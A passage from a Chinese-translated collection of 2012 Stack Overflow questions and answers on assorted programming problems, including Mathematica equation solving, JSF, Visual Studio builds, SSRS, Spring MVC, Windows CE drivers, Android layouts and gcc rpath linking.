          a31 x2 + a32 y2) + (m32 (a23 + a21 x2 + a22 y2))/(a33 + 
         a31 x2 + 
         a32 y2)) && (b13 + (b11 (m13 + m11 x3 + m12 y3))/(m33 + 
         m31 x3 + m32 y3) + (b12 (m23 + m21 x3 + m22 y3))/(m33 + 
         m31 x3 + m32 y3))/(b33 + (b31 (m13 + m11 x3 + m12 y3))/(m33 +
          m31 x3 + m32 y3) + (b32 (m23 + m21 x3 + m22 y3))/(m33 + 
         m31 x3 + 
         m32 y3)) == (m13 + (m11 (a13 + a11 x3 + a12 y3))/(a33 + 
         a31 x3 + a32 y3) + (m12 (a23 + a21 x3 + a22 y3))/(a33 + 
         a31 x3 + a32 y3))/(m33 + (m31 (a13 + a11 x3 + a12 y3))/(a33 +
          a31 x3 + a32 y3) + (m32 (a23 + a21 x3 + a22 y3))/(a33 + 
         a31 x3 + 
         a32 y3)) && (b23 + (b21 (m13 + m11 x3 + m12 y3))/(m33 + 
         m31 x3 + m32 y3) + (b22 (m23 + m21 x3 + m22 y3))/(m33 + 
         m31 x3 + m32 y3))/(b33 + (b31 (m13 + m11 x3 + m12 y3))/(m33 +
          m31 x3 + m32 y3) + (b32 (m23 + m21 x3 + m22 y3))/(m33 + 
         m31 x3 + 
         m32 y3)) == (m23 + (m21 (a13 + a11 x3 + a12 y3))/(a33 + 
         a31 x3 + a32 y3) + (m22 (a23 + a21 x3 + a22 y3))/(a33 + 
         a31 x3 + a32 y3))/(m33 + (m31 (a13 + a11 x3 + a12 y3))/(a33 +
          a31 x3 + a32 y3) + (m32 (a23 + a21 x3 + a22 y3))/(a33 + 
         a31 x3 + 
         a32 y3)) && (b13 + (b11 (m13 + m11 x4 + m12 y4))/(m33 + 
         m31 x4 + m32 y4) + (b12 (m23 + m21 x4 + m22 y4))/(m33 + 
         m31 x4 + m32 y4))/(b33 + (b31 (m13 + m11 x4 + m12 y4))/(m33 +
          m31 x4 + m32 y4) + (b32 (m23 + m21 x4 + m22 y4))/(m33 + 
         m31 x4 + 
         m32 y4)) == (m13 + (m11 (a13 + a11 x4 + a12 y4))/(a33 + 
         a31 x4 + a32 y4) + (m12 (a23 + a21 x4 + a22 y4))/(a33 + 
         a31 x4 + a32 y4))/(m33 + (m31 (a13 + a11 x4 + a12 y4))/(a33 +
          a31 x4 + a32 y4) + (m32 (a23 + a21 x4 + a22 y4))/(a33 + 
         a31 x4 + 
         a32 y4)) && (b23 + (b21 (m13 + m11 x4 + m12 y4))/(m33 + 
         m31 x4 + m32 y4) + (b22 (m23 + m21 x4 + m22 y4))/(m33 + 
         m31 x4 + m32 y4))/(b33 + (b31 (m13 + m11 x4 + m12 y4))/(m33 +
          m31 x4 + m32 y4) + (b32 (m23 + m21 x4 + m22 y4))/(m33 + 
         m31 x4 + 
         m32 y4)) == (m23 + (m21 (a13 + a11 x4 + a12 y4))/(a33 + 
         a31 x4 + a32 y4) + (m22 (a23 + a21 x4 + a22 y4))/(a33 + 
         a31 x4 + a32 y4))/(m33 + (m31 (a13 + a11 x4 + a12 y4))/(a33 +
          a31 x4 + a32 y4) + (m32 (a23 + a21 x4 + a22 y4))/(a33 + 
         a31 x4 + a32 y4)) && m33 == 1, {m11, m12, m13, m21, m22, m23,
   m31, m32}] 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-02T17:54:14.003

为了有任何机会，您将需要实际数字来代替参数变量。否则系统太大而无法处理。

为了说明，我创建了多项式（忽略分母消失的场景），然后对参数进行随机数字替换。我本可以通过替换消除 m33，但选择将 m33-1==0 留在系统中。这样一来，任何一个方程都不需要特殊处理。出于效率考虑，可以考虑对变量中线性的方程子集进行这种消除。

```
In[40]:= exprs = Apply[Subtract, eqns, {1}];
e2 = Together[exprs];
polys = Numerator[e2];

In[62]:= allvars = Variables[polys];
vars = {m11, m12, m13, m21, m22, m23, m31, m32, m33};
params = Complement[allvars, vars]

Out[64]= {a11, a12, a13, a21, a22, a23, a31, a32, a33, b11, b12, b13, \
b21, b22, b23, b31, b32, b33, x1, x2, x3, x4, y1, y2, y3, y4}

In[69]:= SeedRandom[11111];
substitutions = 
  Thread[params -> RandomInteger[{-1000, 1000}, Length[params]]];

In[71]:= numpolys = polys /. substitutions; 
```

NSolve 确定系统实际上是欠定的，也就是说，您的方程具有冗余（代数相关性，更专业地说）。所以它与一个伪随机超平面相交，然后得到一个有限解集。

```
In[73]:= Timing[solns = NSolve[numpolys == 0, vars];]

During evaluation of In[73]:= NSolve::infsolns: Infinite solution set has dimension at least 1\. Returning intersection of solutions with (107814 m11)/118505-(177066 m12)/118505-(164294 m13)/118505+(32943 m21)/23701+(186238 m22)/118505-(126102 m23)/118505-(178233 m31)/118505-(185338 m32)/118505+(141088 m33)/118505 == 1.

Out[73]= {357.420000, Null} 
```

以下是本例中的解决方案。

```
In[74]:= solns // N

Out[74]= {{m11 -> -2.22241, m12 -> 0., m13 -> -2.41203, 
  m21 -> -0.539924, m22 -> 2.33146*10^-172, m23 -> -0.585993, 
  m31 -> 0.921382, m32 -> -4.05984*10^-172, 
  m33 -> 1.}, {m11 -> -2.22241, m12 -> 0., m13 -> -2.41203, 
  m21 -> -0.539924, m22 -> 2.33146*10^-172, m23 -> -0.585993, 
  m31 -> 0.921382, m32 -> -4.05984*10^-172, 
  m33 -> 1.}, {m11 -> -2.22241, m12 -> 0., m13 -> -2.41203, 
  m21 -> -0.539924, m22 -> 2.33146*10^-172, m23 -> -0.585993, 
  m31 -> 0.921382, m32 -> -4.05984*10^-172, 
  m33 -> 1.}, {m11 -> -0.029351, m12 -> 0., m13 -> 0.409304, 
  m21 -> 0.0182228, m22 -> -2.19075*10^-169, m23 -> -0.25412, 
  m31 -> -0.0717095, m32 -> 2.05529*10^-169, 
  m33 -> 1.}, {m11 -> -0.029351, m12 -> 0., m13 -> 0.409304, 
  m21 -> 0.0182228, m22 -> -2.19075*10^-169, m23 -> -0.25412, 
  m31 -> -0.0717095, m32 -> 2.05529*10^-169, 
  m33 -> 1.}, {m11 -> -0.029351, m12 -> 0., m13 -> 0.409304, 
  m21 -> 0.0182228, m22 -> -2.19075*10^-169, m23 -> -0.25412, 
  m31 -> -0.0717095, m32 -> 2.05529*10^-169, 
  m33 -> 1.}, {m11 -> 0.541883, m12 -> 0., m13 -> -0.123031, 
  m21 -> -4.58369, m22 -> -5.60174*10^-170, m23 -> 1.0407, 
  m31 -> -4.40445, m32 -> -5.32622*10^-170, 
  m33 -> 1.}, {m11 -> 0.541883, m12 -> 0., m13 -> -0.123031, 
  m21 -> -4.58369, m22 -> -5.60174*10^-170, m23 -> 1.0407, 
  m31 -> -4.40445, m32 -> -5.32622*10^-170, 
  m33 -> 1.}, {m11 -> 0.541883, m12 -> 0., m13 -> -0.123031, 
  m21 -> -4.58369, m22 -> -5.60174*10^-170, m23 -> 1.0407, 
  m31 -> -4.40445, m32 -> -5.32622*10^-170, m33 -> 1.}} 
```

我们检查它们是否满足具有非常小的数值残差的原始表达式。

```
In[76]:= exprs /. substitutions /. solns

Out[76]= {{-4.44089*10^-16, 1.11022*10^-16, -8.88178*10^-16, 0., 
  0., -1.11022*10^-16, -4.44089*10^-16, 1.11022*10^-16, 
  0.}, {-4.44089*10^-16, 1.11022*10^-16, -8.88178*10^-16, 0., 
  0., -1.11022*10^-16, -4.44089*10^-16, 1.11022*10^-16, 
  0.}, {-4.44089*10^-16, 1.11022*10^-16, -8.88178*10^-16, 0., 
  0., -1.11022*10^-16, -4.44089*10^-16, 1.11022*10^-16, 
  0.}, {-2.22045*10^-16, 1.11022*10^-16, -1.66533*10^-16, 
  1.11022*10^-16, -5.55112*10^-17, 1.11022*10^-16, -1.11022*10^-16, 
  5.55112*10^-17, 0.}, {-2.22045*10^-16, 
  1.11022*10^-16, -1.66533*10^-16, 1.11022*10^-16, -5.55112*10^-17, 
  1.11022*10^-16, -1.11022*10^-16, 5.55112*10^-17, 
  0.}, {-2.22045*10^-16, 1.11022*10^-16, -1.66533*10^-16, 
  1.11022*10^-16, -5.55112*10^-17, 1.11022*10^-16, -1.11022*10^-16, 
  5.55112*10^-17, 0.}, {2.34535*10^-15, -1.11022*10^-15, 
  1.11022*10^-16, 2.22045*10^-16, 1.31839*10^-15, -1.11022*10^-15, 
  1.249*10^-15, -6.66134*10^-16, 
  0.}, {2.34535*10^-15, -1.11022*10^-15, 1.11022*10^-16, 
  2.22045*10^-16, 1.31839*10^-15, -1.11022*10^-15, 
  1.249*10^-15, -6.66134*10^-16, 
  0.}, {2.34535*10^-15, -1.11022*10^-15, 1.11022*10^-16, 
  2.22045*10^-16, 1.31839*10^-15, -1.11022*10^-15, 
  1.249*10^-15, -6.66134*10^-16, 0.}} 
```

# jsf - 为什么 Tomcat 内部运行 firefox 文件下载？

> ID：11735082
> 
> 赞同：0
> 
> 时间：2012-07-31T07:20:04.653
> 
> 标签：jsf, jakarta-ee, tomcat, jsf-2, tomcat7

当我想运行我的 xhtml 文件时，Firefox 文件下载正在 Tomcat 中运行。我该怎么办？请帮我。在此页面之前，它运行良好。但现在 Firefox 文件下载正在 Eclipse 中运行。我不知道我应该怎么做。 ![在此处输入图像描述](../Images/421e1e579a00e9140bb29e1e3160087d.png)

个人资料.xhtml

```
<?xml version="1.0" encoding="utf-8" ?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" 
"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml"
xmlns:h="http://java.sun.com/jsf/html"
xmlns:p="http://primefaces.prime.com.tr/ui"
>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>اطلاعات پرسنلی</title>
</head>
<body>
<h1>اضافه کردن پرسنل جدید</h1>
        <h:form>

            <h:panelGrid columns="6" dir="rtl">
              شماره پرسنلی : 
                <h:inputText id="name" value="#{personelMB.personel_id}" 
                    size="20" required="true"
                    label="id" >
                </h:inputText>
                نام : 
                <h:inputText id="name" value="#{personelMB.pname}" 
                    size="20" required="true"
                    label="Name" >
                </h:inputText>

                 نام خانوادگی: 
                <h:inputText id="family" value="#{personelMB.pfamily}" 
                    size="20" required="true"
                    label="family" >
                </h:inputText> 

                آدرس : 
                <h:inputTextarea id="address" value="#{personelMB.paddress}" 
                    cols="30" rows="10" required="true"
                    label="Address" >
                </h:inputTextarea>

          تلفن:  
                <h:inputText id="tel" value="#{personelMB.pphone}" 
                    size="20" required="true"
                    label="tel" >
                </h:inputText> 
            </h:panelGrid>

            <h:commandButton value="درج اطلاعات" action="#{personelMB.addPersonel()}" />

        </h:form>
</body>
</html> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T07:34:21.160

我清理了tomcat目录并解决了。

# .net - 如何在 Jscript .NET 的新线程中运行方法

> ID：11735083
> 
> 赞同：1
> 
> 时间：2012-07-31T07:20:03.993
> 
> 标签：.net, multithreading, jscript, jscript.net

我一直在寻找2天的答案，我真的被困住了！我找到了这个[问题](https://stackoverflow.com/questions/2474467/instantiating-a-system-threading-thread-object-in-jscript)，但答案不起作用。

我有一个 jscript 类，`WorkerClass`它有一个函数，`PerformCalculation`需要在单独的线程上运行，因为它不能在 UI 线程上运行。

这是我的解决方案：

**`CallerClass`**

```
private function PerformCalculation() {
    var workerClass = new WorkerClass(parameter1, parameter2, parameter3);
    var workDelegate : ThreadStart = new ThreadStart(workerClass.PerformCalculation);
    var workerThread : Thread = new Thread(workDelegate);
    workerThread.Start();
    workerThread.Join();
} 
```

我尝试了一些事情，例如：

*   将`PerformCalculation`函数放入`CallerClass`
*   将`PerformCalculation`函数放在一个单独的类中，即`WorkerClass`
*   使`PerformCalculation`函数`private`,`public`和`static`没有访问修饰符（默认）
*   `var workerThread : Thread = new Thread(workerClass.PerformCalculation);`

在前三个场景中，我得到了以下编译时错误：

```
Delegates should not be explicitly constructed, simply use the method name 
```

最后一种情况给出了以下编译时错误：

```
More than one constructor matches this argument list 
```

您认为我的代码有什么问题，我该如何解决？

提前致谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T08:47:30.007

我认为错误消息清楚地说明了需要做什么：要构造一个委托，不要使用`new`：

```
var workDelegate : ThreadStart = workerClass.PerformCalculation; 
```

# c++ - VS 2010 构建错误

> ID：11735089
> 
> 赞同：0
> 
> 时间：2012-07-31T07:20:22.523
> 
> 标签：c++, windows, visual-studio-2010, visual-c++

我在 2010 年编译了一个在 VS 2005 中开发的可执行 Win32 控制台应用程序。我已经检查了 VS 2005 的所有设置，但它仍然在构建错误之后抛出。请帮忙。

```
 1>------ Rebuild All started: Project: vssreg, Configuration: Debug x64 ------
    1>  stdafx.cpp
    1>c:\Program Files (x86)\Microsoft Visual Studio 10.0\VC\include\crtdefs.h(543): error C2065: '_In_opt_z_' : undeclared identifier
    1>c:\Program Files (x86)\Microsoft Visual Studio 10.0\VC\include\crtdefs.h(543): error C2143: syntax error : missing ')' before 'const'
    1>c:\Program Files (x86)\Microsoft Visual Studio 10.0\VC\include\crtdefs.h(543): warning C4229: anachronism used : modifiers on data are ignored
    1>c:\Program Files (x86)\Microsoft Visual Studio 10.0\VC\include\crtdefs.h(543): error C2182: '_invalid_parameter' : illegal use of type 'void'
    1>c:\Program Files (x86)\Microsoft Visual Studio 10.0\VC\include\crtdefs.h(543): error C2491: '_invalid_parameter' : definition of dllimport data not allowed
    1>c:\Program Files (x86)\Microsoft Visual Studio 10.0\VC\include\crtdefs.h(543): error C2059: syntax error : ')'
    1>c:\Program Files (x86)\Microsoft Visual Studio 10.0\VC\include\crtdefs.h(550): error C2065: '_In_opt_z_' : undeclared identifier
    1>c:\Program Files (x86)\Microsoft Visual Studio 10.0\VC\include\crtdefs.h(550): error C2143: syntax error : missing ')' before 'const'
    1>c:\Program Files (x86)\Microsoft Visual Studio 10.0\VC\include\crtdefs.h(550): warning C4229: anachronism used : modifiers on data are ignored
    1>c:\Program Files (x86)\Microsoft Visual Studio 10.0\VC\include\crtdefs.h(550): error C2182: '_invoke_watson' : illegal use of type 'void'

When I tried to put /ShowIncludes option , im getting following includes info

    1>------ Rebuild All started: Project: vssreg, Configuration: Debug x64 ------
1>  stdafx.cpp
1>  Note: including file: c:\rajesh\hak\hak27x64\2010\hak_27_x64\itxvssreg\stdafx.h
1>  Note: including file:  c:\Program Files (x86)\Microsoft Visual Studio 10.0\VC\include\iostream
1>  Note: including file:   c:\Program Files (x86)\Microsoft Visual Studio 10.0\VC\include\istream
1>  Note: including file:    c:\Program Files (x86)\Microsoft Visual Studio 10.0\VC\include\ostream
1>  Note: including file:     c:\Program Files (x86)\Microsoft Visual Studio 10.0\VC\include\ios
1>  Note: including file:      c:\Program Files (x86)\Microsoft Visual Studio 10.0\VC\include\xlocnum
1>  Note: including file:       c:\Program Files (x86)\Microsoft Visual Studio 10.0\VC\include\climits
1>  Note: including file:        c:\Program Files (x86)\Microsoft Visual Studio 10.0\VC\include\yvals.h
1>  Note: including file:         c:\Program Files (x86)\Microsoft Visual Studio 10.0\VC\include\crtdefs.h
1>  Note: including file:          C:\Program Files\Microsoft SDKs\Windows\v6.1\Include\sal.h
1>  Note: including file:          c:\Program Files (x86)\Microsoft Visual Studio 10.0\VC\include\vadefs.h 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-31T07:26:15.817

你节目中的这条线有点赠品

C:\Program Files\Microsoft SDKs\Windows\v6.1\Include\sal.h

不知何故，您仍然包含一个 VS 2005 标头。作为第一步，我会尝试重命名 v6.1 目录，看看是否能解决问题。如果是这样，请查看您的项目设置，以便不引用 C:\Program Files\Microsoft SDKs。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-31T07:33:34.587

另外（除了检查 Includes、on`VC++ Directories`和之外`C++\General`），尝试更改`Platform Toolset`项目属性。 ![在此处输入图像描述](../Images/e03a543492b4a7393beb253080fb1601.png)

使用 SDK 注册检查注册表项。是的，示例适用于 Windows v7.1。

```
[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Microsoft SDKs\Windows]
"CurrentInstallFolder"="C:\\Program Files\\Microsoft SDKs\\Windows\\v7.1\\"
"ProductVersion"="v7.1"

[HKEY_CURRENT_USER\Software\Microsoft\Microsoft SDKs\Windows]
"CurrentInstallFolder"="C:\\Program Files\\Microsoft SDKs\\Windows\\v7.1\\"
"CurrentVersion"="v7.1" 
```

# sql-server-2008 - 未知集合成员

> ID：11735090
> 
> 赞同：0
> 
> 时间：2012-07-31T07:20:27.067
> 
> 标签：sql-server-2008, reporting-services, expression, visibility

在 SSRS 报告中，我的图表链接到数据集。但是在表达式中它显示“报告项目未链接到数据集”。

我喜欢在没有可用数据时隐藏图表。但是因为我看不到数据集，所以它不起作用。即使我在表达式中提到数据集：

=IIf(Count(Fields!hostname.Value, "DataSetName")=0,True,False)

当我将鼠标悬停在“hostname.Value”=>“未知集合成员”上时，它给了我这个错误。

我已经删除了 .data 文件，因为这里建议使用它，但这不起作用。

任何人的想法？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-31T08:00:24.003

[您可以通过使用CountRows](http://msdn.microsoft.com/en-us/library/ms156330%28v=sql.90%29.aspx)编写表达式来设置图表可见性属性

```
= IIf (CountRows("dataset1") > 0, false, true)
 or 
= IIf (CountRows() > 0, false, true) 
```

或者转到图表的属性窗口。您将看到 NoDataMessage 展开它并在标题中提及

```
No data available 
```

并将属性设置为 false

# java - Spring MVC 一种输入字段形式

> ID：11735101
> 
> 赞同：4
> 
> 时间：2012-07-31T07:21:27.780
> 
> 标签：java, spring-mvc

Spring MVC 中仅向服务器发送表单中的一个字段的最佳方式是什么？我需要发送选择框值，但我也希望选择框预先填充正确的值。

通常我会有一些表单支持对象，并将他绑定到表单，但是当我只有一个字段要发送时，我不需要任何表单支持对象。但是我不使用 form:form 和 form:select 进行绑定，因为它需要指定表单支持对象中的字段。

谢谢。

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-07-31T07:37:30.927

在您的 jsp/view 中，使用经典的 html`<form/>`和`<select/>`：

```
<form id="form" method="POST">
    <select id="selected" name="selected">
        <option value="1">First value</option>
        <option value="2">Second value</option>
    </select>
</form> 
```

在您的控制器中，此方法将`selected`在表单提交完成时获取值：

```
@RequestMapping(method=RequestMethod.POST)
public String submitForm(@RequestParam String selected) {
    // your code here!
    return "nextView";
} 
```

要预填充选择框，您必须手动将值从控制器传递到视图，最后使用 JSTL（或您使用的任何内容）/javascript 选择它。

# eclipse - 如何将eclipse rcp应用程序与mysql数据库连接起来

> ID：11735102
> 
> 赞同：1
> 
> 时间：2012-07-31T07:21:34.210
> 
> 标签：eclipse, rcp

我已经为我的 Eclipse RCP 项目创建了数据库和应用程序。现在如何将这个项目与 MYSQL 数据库连接起来。如果我试图连接它会给出错误“找不到类”。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-05-16T06:47:14.960

用户提出了同样的问题：-点击将 RCP 连接到数据库的链接

[如何通过Eclipse RCP连接Mysql](https://stackoverflow.com/questions/3293321/how-to-connect-to-mysql-through-eclipse-rcp)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-05T21:23:08.127

1.  您可以使用支持 OSGi 捆绑器的 JPA 提供程序，例如[http://www.eclipse.org/eclipselink/downloads/](http://www.eclipse.org/eclipselink/downloads/)。

或者

1.  从 JDBC 驱动程序创建一个插件（来自现有 jar 的插件）并将其设置为依赖于您的应用程序。有了这个，您可以访问驱动程序类（查看 OSGi 捆绑包依赖以获得更多详细信息）

# windows-ce - 启动时未加载 Windows CE 7 SPI 驱动程序

> ID：11735104
> 
> 赞同：0
> 
> 时间：2012-07-31T07:21:39.753
> 
> 标签：windows-ce, device-driver, spi

我是新手。

我想在 Windows CE 7 上开发设备驱动程序。

我在 TI AM33xx 开发板上使用 Adeneo BSP

我想驱动一个 SPI Flash，所以我应该使用 SPI 驱动程序。

我已经编写了我的驱动程序，当我调试它时，所有函数都正确调用。但是当我打电话给

```
CreateFile( _T("SPI1:"),
            GENERIC_READ | GENERIC_WRITE,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            NULL, OPEN_EXISTING, 0, NULL); 
```

deviceHandle 总是返回无效值。因此，当我调试低级 SPI 驱动程序时，我看到 SPI_Init() 流函数从未调用过。

我的 platform.reg 文件中有这个尖齿

```
;===============================================================================
; MCSPI driver
#include "$(_PLATFORMROOT)\AM33x_BSP\SRC\DRIVERS\MCSPI\mcspi.reg" 
```

和

我的 mcspi.reg 文件是

```
;-- SPI Driver -----------------------------------------------------------------
IF BSP_AM33X_MCSPI1
[HKEY_LOCAL_MACHINE\Drivers\BuiltIn\SPI1]
    "Prefix"="SPI"
    "Dll"="am33x_mcspi.dll"
    "Index"=dword:1
    "Port"=dword:1
    "Order"=dword:8
    "MemBase"=multi_sz:"48030000"
    "MemLen"=multi_sz:"00000100"
    "Timeout"=dword:300
    "PowerFlags"=dword:00000103              ; send pre/post device state changes
    ; PMCLASS_PMEXT_GUID
    "IClass"=multi_sz:"{0AE2066F-89A2-4D70-8FC2-29AEFA68413C}"
ENDIF 
```

**[HKEY_LOCAL_MACHINE\Drivers\BuiltIn\SPI1]**这行告诉我们，“SPI1 驱动程序将在启动时加载”，不是吗？？？但是 spi 驱动程序 SPI_Init 函数在启动时从未加载。我在微软白皮书中没有看到任何额外的设置。

另外，

我努力了

```
ActivateDeviceEx(TEXT("Drivers\\BuiltIn\\SPI1"), NULL, 0, NULL); 
```

和

```
LoadLibrary(TEXT("am33x_mcspi.dll")); 
```

功能但结果相同。

驱动程序加载是否有任何额外设置？

谢谢

穆拉特。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-17T18:36:02.733

确保您的驱动程序已编译到您的平面发布目录。然后，将您的驱动程序添加到您的 platform.bib 文件中。像这样的东西：

```
am33x_mcspi.dll $(_FLATRELEASEDIR)\am33x_mcspi.dll NK SH 
```

# web-services - web api 是否比 socket 通信更有优势？

> ID：11735109
> 
> 赞同：0
> 
> 时间：2012-07-31T07:21:53.693
> 
> 标签：web-services, asp.net-web-api

当我编写需要调用服务器才能运行的软件时，web api 是否比套接字通信更具优势？

如果我们编写一个 web api，我们是否可以利用 http、http 服务器、web 应用程序框架来做更多的事情，而不是通过 socket 做同样的功能？

如果我的客户通过互联网调用我的服务器，我们没有任何理由不将其实现为 web api 吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-31T07:49:50.750

我会说“网络 API”是一种“套接字 API”。虽然套接字 API 基本上可以是任何在套接字上运行的东西，但 Web API 是使用 HTTP 协议完成的。这有一些限制，但通常优势更重要：

1.  您重用现有的协议和方法，而不是重新发明自己的协议和方法。这使您的工作更轻松，并且对于不必从头开始实施所有内容的用户来说*更容易；*
2.  您可以使用现有工具（甚至是常规 Web 浏览器）来*调试*您的 API。好吧，使用套接字 API，您通常可以使用 telnet，但对于更复杂的情况，Web 浏览器或任何 HTTP 查询工具更易于使用；
3.  您重用 HTTP 端口 80（和/或 443）。这通常意味着任何防火墙都不太可能禁止您的用户访问您的服务使用的端口。
4.  毕竟，如果您选择了正确的技术，您可以将它们重用“在”甚至“作为”网页。例如，您可以使用 AJAX 或类似技术在网页上的脚本中从 API 捕获数据。

更好的是，如果你只是使用 XML 来做 API 输出，你基本上可以同时把它变成一个 API 和一个网页。您只需向其中添加对 XSLT 样式表的引用，每当 Web 浏览器使用该 API 时，它就会使用它将原始 XML 转换为 HTML。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-31T07:37:18.347

**Web 服务只输出 XML 而不是 HTML。创建 Web 服务的原因与创建网站的原因没有什么不同**。

可以远程调用 Web API。

可以以独立的方式调用 Web API。这意味着您可以允许您的用户（和您）使用您为最终客户构建的其他界面。

**您可以按照您想要的方式对 API 进行编程。** 唯一的要求是生成有效的 XML。所以，是的，您可以使用一些框架，您应该使用 Web 服务器作为输出网页的服务器。

如果客户端通过 Internet (SAAS) 调用您的服务，则创建 Web 服务允许您提供新接口。为了使用 SOAP 并允许刷新网页以及将数据提供给重型客户端，需要 Web 服务。

# cocoa - 获取鼠标在屏幕上的位置

> ID：11735113
> 
> 赞同：0
> 
> 时间：2012-07-31T07:22:12.840
> 
> 标签：cocoa

我有以下代码用于在屏幕上获取鼠标位置：

```
 NSPoint loc = [NSEvent mouseLocation];
    NSLog(@"x:%.2f y:%.2f",loc.x, loc.y); 
```

当我点击我的应用程序窗口时，我设置了一个动作，我可以在其中跟踪这个动作。但是，令我惊讶的是，无论我点击窗口，它都会提供或多或少相同的值。我在屏幕上的不同位置移动窗口。

结果如下：

2012-07-31 12:50:08.740 MyApp[2860:d03] x:432.19 y:450.07（当窗口位于屏幕顶部时） 2012-07-31 12:50:19.042 MyApp[2860:d03] x: 435.14 y:453.16（当窗口位于屏幕底部时）

# android - 以编程方式传递块布局？

> ID：11735116
> 
> 赞同：3
> 
> 时间：2012-07-31T07:22:37.550
> 
> 标签：android, android-layout, android-widget

这是我的视图层次结构：

-RelativeLayout [rootView] (根)

*   LinearLayout [menu_holder]（菜单片段布局）

*   RelativeLayout [app_holder]（应用内容布局）

    *   Action Bar（实现 ActionBar < 2.1 的自定义视图

    *   FrameLayout [content_fragment]（加载内容片段的布局）

    *   FloatingMenu（自定义 LinearLayout 以显示浮动小部件）

```
<com.example.app.views.widgets.RootLayout 
    xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools"
    android:id="@+id/drag_layout"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent"
    android:background="@color/white" >

    <LinearLayout
       android:id="@+id/menu_holder"
       android:layout_width="fill_parent"
       android:layout_height="fill_parent"
       android:background="@color/red"
       android:orientation="vertical" />

    <com.example.app.views.widgets.AppHolder
    android:id="@+id/app_holder"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent"
    android:background="@color/gray" >

    <com.example.app.widgets.ActionBar
        android:id="@+id/action_bar"
        android:layout_width="fill_parent"
        android:layout_height="wrap_content" />

    <FrameLayout
        android:id="@+id/content_holder"
        android:layout_width="fill_parent"
        android:layout_height="fill_parent"
        android:layout_below="@+id/action_bar"
        android:background="@drawable/backrepeat" >
    </FrameLayout>

    <com.example.app.widgets.FloatingMenu
        android:id="@+id/floating_menu"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_alignParentBottom="true"
        android:layout_alignParentRight="true"
        android:padding="15dp"
        android:visibility="gone" />
    </com.example.app.views.widgets.AppHolder>
</com.example.app.views.widgets.RootLayout> 
```

现在我将 menu_holder 和 app_holder 都加载到 rootView 中，这样 app_holder 就保持在顶部。现在，当用户按下 MENU 按钮时，app_holder 向右滑动以在左侧显示底层菜单片段，如下图所示：

![在此处输入图像描述](../Images/c5aa9720b62cb620d86064a2d04c4545.png)

我在可运行文件中使用了一个[滚动](http://developer.android.com/reference/android/widget/Scroller.html)条来向右滑动 app_holder。在偏移我的 app_holder 后，我还每隔 16 毫秒在 rootView 上调用一次 invalidate()。

它工作正常，但是当菜单片段可见时，当任何内容加载到 content_fragment（可见性集或从 web 加载）中时，就会出现问题。无效的视图（越界）调用 requestLayout() 并且以下布局调用将 app_holder 重置为其初始位置。我已经在我的 content_fragment 上实现了延迟加载列表视图，因此列表视图上的任何更新（notifyDataSetChanged 等）都会启动重新布局调用。

如何阻止这种情况发生？

在右侧所有动态加载的视图上覆盖和评论 requestLayout() 将解决问题，但是还有其他正确的方法吗？

# c++ - 如何在同一系统中运行使用不同 gcc 版本生成的两个可执行文件

> ID：11735118
> 
> 赞同：1
> 
> 时间：2012-07-31T07:22:41.340
> 
> 标签：c++, gcc, load, runtime-error

我有两个使用不同 gcc 版本生成的可执行文件，一个正在使用`gcc 3.4.2`，另一个`gcc 4.3.2`在我的 Linux 机器中使用

两者都必须在相同的环境中运行，即具有相同的**LD_LIBRARY_PATH**。

当前的路径`4.3.2`放置在`3.4.2`给出`3.4.2`错误之前。

`libstdc++.so.6: version 'GLIBCXX_3.4.9' not found (required by../../src/hello)`

我正在考虑一种解决方案，我可以将信息存储在 exe 中以查找所需的加载时间文件。

**我在下面创建了有问题的构建脚本：**

基本上 O3 选项正在优化。

```
/opt/gcc-4.3.2/bin/g++ -pipe -O3 -c hello4_3_2.cpp
/opt/gcc-4.3.2/bin/g++ -o hello4_3_2 hello4_3_2.o -L$/opt/gcc-4.3.2/lib64/libstdc++

/opt/gcc-3.4.2/bin/g++ -pipe -O3 -c hello3_4_2.cpp
/opt/gcc-3.4.2/bin/g++ -o hello3_4_2 hello3_4_2.o -L$/opt/gcc-3.4.2/lib64/libstdc++ 
```

**下面的脚本适用于我：（没有 O3 选项）**

```
/opt/gcc-4.3.2/bin/g++ -pipe  -c hello4_3_2.cpp
/opt/gcc-4.3.2/bin/g++ -o hello4_3_2 hello4_3_2.o -L$/opt/gcc-4.3.2/lib64/libstdc++

/opt/gcc-3.4.2/bin/g++ -pipe  -c hello3_4_2.cpp
/opt/gcc-3.4.2/bin/g++ -o hello3_4_2 hello3_4_2.o -L$/opt/gcc-3.4.2/lib64/libstdc++ 
```

**现在：**

1.  我想知道是否有其他方法可以实现它。

2.  这样做有什么缺点吗。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-31T07:24:40.027

链接时指定一个`rpath`：

```
/opt/gcc-4.3.2/bin/g++ -o hello4_3_2 hello4_3_2.o -Wl,-rpath,/opt/gcc-4.3.2/lib64
#                                                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ 
```

这会将库搜索路径硬编码到可执行文件中。

您可以`ldd ./hello4_3_2`在不运行的情况下检查是否找到了正确的库。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-31T12:14:03.840

